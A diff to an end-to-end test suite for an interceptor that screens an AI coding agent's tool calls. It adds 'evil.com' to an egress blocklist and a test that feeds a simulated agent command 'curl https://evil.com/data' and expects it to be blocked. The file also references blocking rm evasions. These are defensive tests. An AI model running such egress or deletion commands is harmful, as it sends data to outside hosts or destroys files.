@@ -75,6 +75,7 @@ describe("Copilot Handler Script (E2E)", () => {
       projectDir: tmpDir,
       enforcement_mode: "enforce",
       toolBlocklist: ["NotebookEdit"],
+      egressBlockedDomains: ["evil.com"],
       log_level: "silent",
     });
     await interceptor.start();
@@ -102,6 +103,7 @@ describe("Copilot Handler Script (E2E)", () => {
     const interceptor = new CopilotInterceptor({
       projectDir: project,
       enforcement_mode: "monitor",
+      egressBlockedDomains: ["evil.com"],
       log_level: "silent",
     });
     await interceptor.start();
@@ -207,6 +209,21 @@ describe("Copilot Handler Script (E2E)", () => {
     const result = await runHandler(handlerPath, input);
     expect(result.exitCode).toBe(2);
     expect(result.stderr).toContain("curl");
+  });
+
+  it("blocks network egress to blocked domains (exit 2)", async () => {
+    const input = JSON.stringify({
+      timestamp: Date.now(),
+      cwd: tmpDir,
+      hookEventName: "PreToolUse",
+      toolName: "bash",
+      toolArgs: JSON.stringify({ command: "curl https://evil.com/data" }),
+    });
+
+    const result = await runHandler(handlerPath, input);
+    expect(result.exitCode).toBe(2);
+    expect(result.stderr).toContain("Network egress");
+    expect(result.stderr).toContain("evil.com");
   });
 
   it("blocks /bin/rm and command rm evasions (exit 2)", async () => {
